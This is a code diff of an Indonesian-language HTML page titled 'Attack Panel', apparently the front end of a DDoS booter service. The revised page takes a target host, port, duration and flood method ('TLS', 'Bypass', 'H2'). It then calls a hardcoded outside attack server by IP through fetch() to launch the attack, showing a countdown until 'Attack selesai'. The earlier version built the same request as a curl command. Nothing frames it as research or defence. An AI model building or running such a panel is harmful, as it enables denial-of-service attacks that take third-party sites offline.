@@ -1,115 +1,162 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attack Panel</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #121212;
-            color: white;
-        }
-        .container {
-            margin-top: 50px;
-        }
-        input, select, button {
-            display: block;
-            margin: 10px auto;
-            padding: 10px;
-            font-size: 16px;
-        }
-        button {
-            background-color: red;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: darkred;
-        }
-        .log {
-            margin-top: 20px;
-            font-size: 14px;
-            white-space: pre-line;
-            word-break: break-word;
-            max-width: 90%;
-            margin-left: auto;
-            margin-right: auto;
-            background: #1e1e1e;
-            padding: 15px;
-            border-radius: 10px;
-        }
-        #copyButton {
-            margin-top: 10px;
-            background-color: green;
-        }
-        #copyButton:hover {
-            background-color: darkgreen;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attack Panel Modern</title>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #0f0f0f;
+      color: #eee;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .card {
+      background: #1c1c1c;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+      width: 350px;
+      text-align: center;
+      animation: fadeIn 0.8s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #ff4d4d;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+      outline: none;
+    }
+
+    input, select {
+      background: #333;
+      color: white;
+    }
+
+    button {
+      background: linear-gradient(90deg, #ff4d4d, #ff1a1a);
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: linear-gradient(90deg, #ff1a1a, #e60000);
+    }
+
+    .log {
+      background: #2a2a2a;
+      padding: 15px;
+      margin-top: 20px;
+      font-size: 14px;
+      white-space: pre-line;
+      word-break: break-word;
+      border-radius: 10px;
+      max-height: 300px;
+      overflow-y: auto;
+      text-align: left;
+    }
+
+    .timer {
+      margin-top: 10px;
+      font-size: 18px;
+      color: #00ff00;
+    }
+
+    .loading {
+      margin-top: 15px;
+      font-size: 14px;
+      color: yellow;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>🔥 Attack Panel 🔥</h1>
+<div class="card">
+  <h1>🔥 Attack Panel 🔥</h1>
 
-        <label>Target Host:</label>
-        <input type="text" id="host" placeholder="https://target.com">
+  <input type="text" id="host" placeholder="https://target.com">
+  <input type="number" id="port" placeholder="80">
+  <input type="number" id="time" placeholder="60">
+  <select id="methods">
+    <option value="tls">TLS</option>
+    <option value="bypass">Bypass</option>
+    <option value="h2">H2</option>
+  </select>
 
-        <label>Port:</label>
-        <input type="number" id="port" placeholder="80">
+  <button onclick="sendAttack()">🚀 MULAI SERANG</button>
 
-        <label>Time (Seconds):</label>
-        <input type="number" id="time" placeholder="60">
+  <div class="loading" id="loading" style="display:none;">Mengirim serangan...</div>
+  <div class="timer" id="timer" style="display:none;"></div>
+  <div class="log" id="log"></div>
+</div>
 
-        <label>Methods:</label>
-        <select id="methods">
-            <option value="tls">TLS</option>
-            <option value="bypass">Bypass</option>
-            <option value="h2">H2</option>
-        </select>
+<script>
+  async function sendAttack() {
+    const host = document.getElementById('host').value;
+    const port = document.getElementById('port').value;
+    const time = document.getElementById('time').value;
+    const methods = document.getElementById('methods').value.toUpperCase();
 
-        <button onclick="generateCurl()">🚀 ATTACK!</button>
+    if (!host || !port || !time || !methods) {
+      alert("⚠️ Harap isi semua data!");
+      return;
+    }
 
-        <div class="log" id="log"></div>
-        <button id="copyButton" onclick="copyCurl()" style="display:none;">📋 Copy Command</button>
-    </div>
+    const url = `http://64.227.139.46:4877/attack?host=${encodeURIComponent(host)}&port=${port}&time=${time}&methods=${methods}`;
 
-    <script>
-        let currentCurl = '';
+    document.getElementById("loading").style.display = "block";
+    document.getElementById("log").innerText = "";
+    document.getElementById("timer").style.display = "none";
 
-        function generateCurl() {
-            const host = document.getElementById('host').value;
-            const port = document.getElementById('port').value;
-            const time = document.getElementById('time').value;
-            const methods = document.getElementById('methods').value.toUpperCase();
+    try {
+      const response = await fetch(url);
+      const result = await response.json();
+      document.getElementById("log").innerText = `📜 Log Response:\n${JSON.stringify(result, null, 2)}`;
+      document.getElementById("loading").style.display = "none";
+      startTimer(time);
+    } catch (error) {
+      document.getElementById("log").innerText = `❌ Error:\n${error}`;
+      document.getElementById("loading").style.display = "none";
+    }
+  }
 
-            if (!host || !port || !time || !methods) {
-                alert("⚠️ Harap isi semua data!");
-                return;
-            }
+  function startTimer(duration) {
+    let timeLeft = parseInt(duration);
+    const timerElement = document.getElementById("timer");
+    timerElement.style.display = "block";
+    timerElement.innerText = `⏳ Waktu tersisa: ${timeLeft} detik`;
 
-            const url = `http://64.227.139.46:4877/attack?host=${encodeURIComponent(host)}&port=${port}&time=${time}&methods=${methods}`;
-            const curlCommand = `curl "${url}"`;
-
-            currentCurl = curlCommand;
-
-            document.getElementById("log").innerText = `💻 Command CURL:\n${curlCommand}`;
-            document.getElementById("copyButton").style.display = "inline-block";
-        }
-
-        function copyCurl() {
-            navigator.clipboard.writeText(currentCurl)
-                .then(() => {
-                    alert('✅ Command berhasil di-copy!');
-                })
-                .catch(err => {
-                    alert('❌ Gagal copy: ' + err);
-                });
-        }
-    </script>
+    const countdown = setInterval(() => {
+      timeLeft--;
+      timerElement.innerText = `⏳ Waktu tersisa: ${timeLeft} detik`;
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        timerElement.innerText = "✅ Attack selesai!";
+      }
+    }, 1000);
+  }
+</script>
 
 </body>
 </html>
